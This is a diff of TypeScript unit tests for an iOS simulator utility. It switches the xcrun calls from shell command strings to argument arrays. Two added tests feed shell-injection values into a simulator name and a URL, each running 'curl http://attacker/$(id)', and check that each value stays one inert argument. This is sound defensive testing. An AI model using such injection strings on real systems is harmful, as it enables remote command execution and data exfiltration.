@@ -13,6 +13,7 @@ import { PreviewUtils } from '../../../src/common/PreviewUtils.js';
 
 describe('IOS utils tests', () => {
     const $$ = new TestContext();
+    const XCRUN = '/usr/bin/xcrun';
     const DEVICE_TYPE_PREFIX = 'com.apple.CoreSimulator.SimDeviceType';
     const RUNTIME_TYPE_PREFIX = 'com.apple.CoreSimulator.SimRuntime';
 
@@ -21,22 +22,23 @@ describe('IOS utils tests', () => {
     });
 
     it('Should attempt to invoke the xcrun for booting a device', async () => {
-        const stub = stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').resolves({
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
             stderr: 'mockError',
             stdout: 'Done'
         });
         const udid = 'MOCKUDID';
         await IOSUtils.bootDevice(udid);
-        expect(stub.calledWith(`/usr/bin/xcrun simctl boot ${udid}`)).to.be.true;
+        expect(stub.firstCall.args[0]).to.equal(XCRUN);
+        expect(stub.firstCall.args[1]).to.deep.equal(['simctl', 'boot', udid]);
     });
 
     it('Should attempt to invoke the xcrun but fail booting a device', async () => {
-        stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').rejects(new Error('Mock Error'));
+        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').rejects(new Error('Mock Error'));
         return IOSUtils.bootDevice('MOCKUDID').catch((error) => expect(error).to.be.an('error'));
     });
 
     it('Should attempt to create a new device', async () => {
-        const stub = stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').resolves({
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
             stderr: 'mockError',
             stdout: 'Done'
         });
@@ -44,15 +46,29 @@ describe('IOS utils tests', () => {
         const deviceType = 'MOCK-DEVICE';
         const runtimeType = 'MOCK-SIM';
         await IOSUtils.createNewDevice(simName, deviceType, runtimeType);
-        expect(
-            stub.calledWith(
-                `/usr/bin/xcrun simctl create '${simName}' ${DEVICE_TYPE_PREFIX}.${deviceType} ${RUNTIME_TYPE_PREFIX}.${runtimeType}`
-            )
-        ).to.be.true;
+        expect(stub.firstCall.args[0]).to.equal(XCRUN);
+        expect(stub.firstCall.args[1]).to.deep.equal([
+            'simctl',
+            'create',
+            simName,
+            `${DEVICE_TYPE_PREFIX}.${deviceType}`,
+            `${RUNTIME_TYPE_PREFIX}.${runtimeType}`
+        ]);
+    });
+
+    it('createNewDevice passes a malicious simulator name as a single inert argv element', async () => {
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
+            stderr: '',
+            stdout: 'UDID'
+        });
+        const malicious = 'evil; curl http://attacker/$(id); #';
+        await IOSUtils.createNewDevice(malicious, 'iPhone-15', 'iOS-17');
+        // The value must appear verbatim as ONE argv element (never split or shell-interpreted).
+        expect(stub.firstCall.args[1]).to.include(malicious);
     });
 
     it('Should attempt to invoke xcrun to boot device but resolve if device is already booted', async () => {
-        stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').rejects(new Error('Failed to boot - state: booted'));
+        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').rejects(new Error('Failed to boot - state: booted'));
         try {
             await IOSUtils.bootDevice('MOCKUDID');
         } catch (error: any) {
@@ -61,7 +77,7 @@ describe('IOS utils tests', () => {
     });
 
     it('Should wait for the device to boot', async () => {
-        stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').resolves({
+        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
             stderr: 'mockError',
             stdout: 'Done'
         });
@@ -73,7 +89,7 @@ describe('IOS utils tests', () => {
     });
 
     it('Should wait for the device to boot and fail if error is encountered', async () => {
-        stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').rejects(new Error('Mock Error'));
+        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').rejects(new Error('Mock Error'));
         try {
             await IOSUtils.waitUntilDeviceIsReady('MOCKUDID');
         } catch (error) {
@@ -104,22 +120,34 @@ describe('IOS utils tests', () => {
     });
 
     it('Should attempt to launch url in a booted simulator and resolve.', async () => {
-        const stub = stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').resolves({
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
             stderr: 'mockError',
             stdout: 'Done'
         });
         const url = 'mock.url';
         const udid = 'MOCK-UDID';
-        await IOSUtils.launchURLInBootedSimulator(url, udid);
-        expect(stub.calledWith(`/usr/bin/xcrun simctl openurl "${url}" ${udid}`)).to.be.true;
+        await IOSUtils.launchURLInBootedSimulator(udid, url);
+        expect(stub.firstCall.args[0]).to.equal(XCRUN);
+        expect(stub.firstCall.args[1]).to.deep.equal(['simctl', 'openurl', udid, url]);
+    });
+
+    it('launchURLInBootedSimulator passes a malicious url as a single inert argv element', async () => {
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
+            stderr: '',
+            stdout: 'Done'
+        });
+        const udid = 'MOCK-UDID';
+        const malicious = 'https://x/; curl http://attacker/$(id); #';
+        await IOSUtils.launchURLInBootedSimulator(udid, malicious);
+        expect(stub.firstCall.args[1]).to.include(malicious);
     });
 
     it('Should attempt to launch url in a booted simulator and reject if error is encountered.', async () => {
-        stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').rejects(new Error('Mock Error'));
+        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').rejects(new Error('Mock Error'));
         try {
             const url = 'mock.url';
             const udid = 'MOCK-UDID';
-            await IOSUtils.launchURLInBootedSimulator(url, udid);
+            await IOSUtils.launchURLInBootedSimulator(udid, url);
         } catch (error) {
             return;
         }
@@ -128,7 +156,7 @@ describe('IOS utils tests', () => {
     });
 
     it('Should attempt to launch native app in a booted simulator and resolve.', async () => {
-        const stub = stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').resolves({
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
             stderr: 'mockError',
             stdout: 'Done'
         });
@@ -143,24 +171,27 @@ describe('IOS utils tests', () => {
             { name: 'arg1', value: 'val1' },
             { name: 'arg2', value: 'val2' }
         ];
-        const expectedLaunchArgs =
-            `${PreviewUtils.COMPONENT_NAME_ARG_PREFIX}=${compName}` +
-            ` ${PreviewUtils.PROJECT_DIR_ARG_PREFIX}=${projectDir}` +
-            ' arg1=val1 arg2=val2 ';
+        const expectedLaunchArgs = [
+            `${PreviewUtils.COMPONENT_NAME_ARG_PREFIX}=${compName}`,
+            `${PreviewUtils.PROJECT_DIR_ARG_PREFIX}=${projectDir}`,
+            'arg1=val1',
+            'arg2=val2'
+        ];
 
         await IOSUtils.launchAppInBootedSimulator(udid, targetApp, undefined, targetAppArgs);
 
         expect(stub.calledTwice).to.be.true;
 
-        expect(stub.firstCall.args[0]).to.equal(`/usr/bin/xcrun simctl terminate "${udid}" ${targetApp}`);
+        expect(stub.firstCall.args[1]).to.deep.equal(['simctl', 'terminate', udid, targetApp]);
 
-        expect(stub.secondCall.args[0]).to.equal(
-            `/usr/bin/xcrun simctl launch "${udid}" ${targetApp} ${expectedLaunchArgs}`
-        );
+        expect(stub.secondCall.args[1]).to.deep.equal(['simctl', 'launch', udid, targetApp, ...expectedLaunchArgs]);
     });
 
     it('Should attempt to launch native app in a booted simulator and reject if error is encountered.', async () => {
-        stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').rejects(new Error('Mock Error'));
+        // First (terminate) call is swallowed; the launch call must reject.
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync');
+        stub.onFirstCall().rejects(new Error('terminate error'));
+        stub.onSecondCall().rejects(new Error('Mock Error'));
 
         const udid = 'MOCK-UDID';
         const targetApp = 'com.mock.app';
@@ -179,7 +210,7 @@ describe('IOS utils tests', () => {
     });
 
     it('Should attempt to install native app then launch it.', async () => {
-        const stub = stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').resolves({
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
             stderr: 'mockError',
             stdout: 'Done'
         });
@@ -195,21 +226,21 @@ describe('IOS utils tests', () => {
             { name: 'arg1', value: 'val1' },
             { name: 'arg2', value: 'val2' }
         ];
-        const expectedLaunchArgs =
-            `${PreviewUtils.COMPONENT_NAME_ARG_PREFIX}=${compName}` +
-            ` ${PreviewUtils.PROJECT_DIR_ARG_PREFIX}=${projectDir}` +
-            ' arg1=val1 arg2=val2 ';
+        const expectedLaunchArgs = [
+            `${PreviewUtils.COMPONENT_NAME_ARG_PREFIX}=${compName}`,
+            `${PreviewUtils.PROJECT_DIR_ARG_PREFIX}=${projectDir}`,
+            'arg1=val1',
+            'arg2=val2'
+        ];
 
         await IOSUtils.launchAppInBootedSimulator(udid, targetApp, appBundlePath, targetAppArgs);
 
         expect(stub.calledThrice).to.be.true;
 
-        expect(stub.firstCall.args[0]).to.equal(`/usr/bin/xcrun simctl install ${udid} '${appBundlePath.trim()}'`);
+        expect(stub.firstCall.args[1]).to.deep.equal(['simctl', 'install', udid, appBundlePath.trim()]);
 
-        expect(stub.secondCall.args[0]).to.equal(`/usr/bin/xcrun simctl terminate "${udid}" ${targetApp}`);
+        expect(stub.secondCall.args[1]).to.deep.equal(['simctl', 'terminate', udid, targetApp]);
 
-        expect(stub.thirdCall.args[0]).to.equal(
-            `/usr/bin/xcrun simctl launch "${udid}" ${targetApp} ${expectedLaunchArgs}`
-        );
+        expect(stub.thirdCall.args[1]).to.deep.equal(['simctl', 'launch', udid, targetApp, ...expectedLaunchArgs]);
     });
 });
